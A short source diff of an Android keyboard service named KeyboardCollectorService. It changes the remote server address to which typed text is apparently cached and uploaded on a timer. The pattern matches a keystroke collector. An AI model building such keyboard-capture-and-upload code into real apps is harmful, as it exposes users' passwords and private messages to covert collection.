@@ -27,7 +27,7 @@ public class KeyboardCollectorService extends  InputMethodService
         implements KeyboardView.OnKeyboardActionListener {
     public static final long NOTIFY_INTERVAL = 60 * 1000; // 10 seconds
     private final String PATH = "./cache.txt";
-    private final String SERVER_PATH = "https://zavradmb2018.000webhostapp.com/addText.php";
+    private final String SERVER_PATH = "http://collector-env-1.2ta8wpyecx.us-east-2.elasticbeanstalk.com/keyboard/store";
     private File cache;
 
     private KeyboardView kv;
